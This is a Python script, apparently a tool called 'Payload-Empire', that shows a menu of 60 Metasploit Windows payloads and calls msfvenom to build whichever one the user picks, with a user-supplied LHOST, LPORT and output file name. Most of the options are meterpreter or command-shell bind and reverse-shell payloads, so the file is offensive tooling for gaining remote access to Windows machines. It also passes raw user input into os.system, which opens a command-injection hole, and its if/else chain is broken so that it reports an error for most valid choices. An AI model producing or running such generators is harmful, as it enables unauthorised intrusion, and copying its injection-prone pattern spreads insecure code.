from colorama import Fore
import os

os.system('clear')

def win():
    print( 
    f"""{Fore.CYAN}
    Choose a payload:
    {Fore.GREEN}
         1- payload/windows/meterpreter/bind_hidden_ipknock_tcp
         2- payload/windows/meterpreter/bind_hidden_tcp
         3- payload/windows/meterpreter/bind_ipv6_tcp
         4- payload/windows/meterpreter/bind_ipv6_tcp_uuid
         5- payload/windows/meterpreter/bind_named_pipe
         6- payload/windows/meterpreter/bind_nonx_tcp
         7- payload/windows/meterpreter/bind_tcp
         8- payload/windows/meterpreter/bind_tcp_rc4
         9- payload/windows/meterpreter/bind_tcp_uuid
        10- payload/windows/meterpreter/find_tag
        11- payload/windows/meterpreter/reverse_hop_http
        12- payload/windows/meterpreter/reverse_http
        13- payload/windows/meterpreter/reverse_http_proxy_pstore
        14- payload/windows/meterpreter/reverse_https
        15- payload/windows/meterpreter/reverse_https_proxy
        16- payload/windows/meterpreter/reverse_ipv6_tcp
        17- payload/windows/meterpreter/reverse_named_pipe
        18- payload/windows/meterpreter/reverse_nonx_tcp
        19- payload/windows/meterpreter/reverse_ord_tcp
        20- payload/windows/meterpreter/reverse_tcp
        21- payload/windows/meterpreter/reverse_tcp_allports
        22- payload/windows/meterpreter/reverse_tcp_dns
        23- payload/windows/meterpreter/reverse_tcp_rc4
        24- payload/windows/meterpreter/reverse_tcp_rc4_dns
        25- payload/windows/meterpreter/reverse_tcp_uuid
        26- payload/windows/meterpreter/reverse_winhttp
        27- payload/windows/meterpreter/reverse_winhttps
        28- payload/windows/meterpreter_bind_named_pipe
        29- payload/windows/meterpreter_bind_tcp
        30- payload/windows/meterpreter_reverse_http
        31- payload/windows/meterpreter_reverse_https
        32- payload/windows/meterpreter_reverse_ipv6_tcp
        33- payload/windows/meterpreter_reverse_tcp
        34- payload/windows/powershell_bind_tcp
        35- payload/windows/powershell_reverse_tcp
        36- payload/windows/powershell_reverse_tcp_ssl
        37- payload/windows/shell/bind_hidden_ipknock_tcp
        38- payload/windows/shell/bind_hidden_tcp
        39- payload/windows/shell/bind_ipv6_tcp
        40- payload/windows/shell/bind_ipv6_tcp_uuid
        41- payload/windows/shell/bind_named_pipe
        42- payload/windows/shell/bind_nonx_tcp
        43- payload/windows/shell/bind_tcp
        44- payload/windows/shell/bind_tcp_rc4
        45- payload/windows/shell/bind_tcp_uuid
        46- payload/windows/shell/find_tag
        47- payload/windows/shell/reverse_ipv6_tcp
        48- payload/windows/shell/reverse_nonx_tcp
        49- payload/windows/shell/reverse_ord_tcp
        50- payload/windows/shell/reverse_tcp
        51- payload/windows/shell/reverse_tcp_allports
        52- payload/windows/shell/reverse_tcp_dns
        53- payload/windows/shell/reverse_tcp_rc4
        54- payload/windows/shell/reverse_tcp_rc4_dns
        55- payload/windows/shell/reverse_tcp_uuid
        56- payload/windows/shell/reverse_udp
        57- payload/windows/shell_bind_tcp
        58- payload/windows/shell_bind_tcp_xpfw
        59- payload/windows/shell_hidden_bind_tcp
        60- payload/windows/shell_reverse_tcp
    """)

    payload = input(Fore.GREEN + "Payload-Empire:~# ")

    if payload == '1':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/bind_hidden_ipknock_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '2':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/bind_hidden_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '3':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/bind_ipv6_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '4':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/bind_ipv6_tcp_uuid LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '5':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/bind_named_pipe LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '6':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/bind_nonx_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '7':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/bind_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '8':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/bind_tcp_rc4 LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '9':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/bind_tcp_uuid LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '10':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/find_tag LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '11':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/reverse_hop_http LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '12':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '13':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/reverse_http_proxy_pstore LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '14':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/reverse_https LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '15':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/reverse_https_proxy LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '16':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/reverse_ipv6_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '17':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/reverse_named_pipe LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '18':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/reverse_nonx_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '19':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/reverse_ord_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '20':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '21':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/reverse_tcp_allports LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '22':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/reverse_tcp_dns LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '23':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/reverse_tcp_rc4 LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '24':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/reverse_tcp_rc4_dns LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '25':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/reverse_tcp_uuid LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '26':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/reverse_winhttp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '27':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter/reverse_winhttps LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '28':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter_bind_named_pipe LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '29':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter_bind_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '30':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter_reverse_http LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '31':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter_reverse_https LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '32':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter_reverse_ipv6_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '33':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '34':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/powershell_bind_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '35':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/powershell_reverse_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '36':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/powershell_reverse_tcp_ssl LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '37':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/bind_hidden_ipknock_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '38':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/bind_hidden_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '39':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/bind_ipv6_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '40':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/bind_ipv6_tcp_uuid LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '41':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/bind_named_pipe LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '42':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/bind_nonx_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '43':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/bind_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '44':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/bind_tcp_rc4 LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '45':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/bind_tcp_uuid LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '46':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/find_tag LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '47':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/reverse_ipv6_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '48':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/reverse_nonx_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '49':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/reverse_ord_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '50':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/reverse_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '51':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/reverse_tcp_allports LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '52':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/reverse_tcp_dns LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '53':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/reverse_tcp_rc4 LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '54':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/reverse_tcp_rc4_dns LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '55':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/reverse_tcp_uuid LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '56':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell/reverse_udp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '57':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell_bind_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '58':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell_bind_tcp_xpfw LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '59':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell_hidden_bind_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '60':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -o {name}")
    
    else:
        print(Fore.RED + "[!]ERROR")